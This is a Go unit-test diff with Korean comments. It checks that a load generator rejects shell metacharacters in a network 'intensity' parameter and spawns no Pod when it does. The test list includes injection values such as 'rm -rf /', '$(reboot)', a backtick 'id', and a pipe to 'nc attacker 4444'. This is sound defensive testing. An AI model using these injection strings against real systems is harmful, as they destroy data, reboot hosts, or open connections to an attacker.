@@ -329,3 +329,35 @@ func TestSanitizeName(t *testing.T) {
 var _ = apierrors.IsNotFound
 var _ schema.GroupVersionResource
 var _ types.NamespacedName
+
+// TestNetwork_RejectsShellMetaIntensity 는 #253 의 sh -c 결합 전 재검증을 검증한다. 셸 메타문자를
+// 담은 intensity 는 safety 패키지의 상태와 무관하게 loadgen 경계에서 거부되고 Pod 가 spawn 되지
+// 않아야 한다.
+func TestNetwork_RejectsShellMetaIntensity(t *testing.T) {
+	for _, evil := range []string{
+		"100M; rm -rf /",
+		"100M$(reboot)",
+		"100M`id`",
+		"100M|nc attacker 4444",
+		"100 M",
+	} {
+		client := fake.NewSimpleClientset()
+		g, err := New(KindNetwork, client)
+		if err != nil {
+			t.Fatalf("New: %v", err)
+		}
+		params := defaultParams()
+		params.Intensity = evil
+		if err := g.Start(context.Background(), params); err == nil {
+			t.Errorf("intensity %q 인데 Start 가 성공함 (재검증 누락)", evil)
+			continue
+		}
+		pods, err := client.CoreV1().Pods("ebpf-project").List(context.Background(), metav1.ListOptions{})
+		if err != nil {
+			t.Fatalf("list: %v", err)
+		}
+		if len(pods.Items) != 0 {
+			t.Errorf("intensity %q 거부 후 pods=%d want 0 (고아 Pod 금지)", evil, len(pods.Items))
+		}
+	}
+}
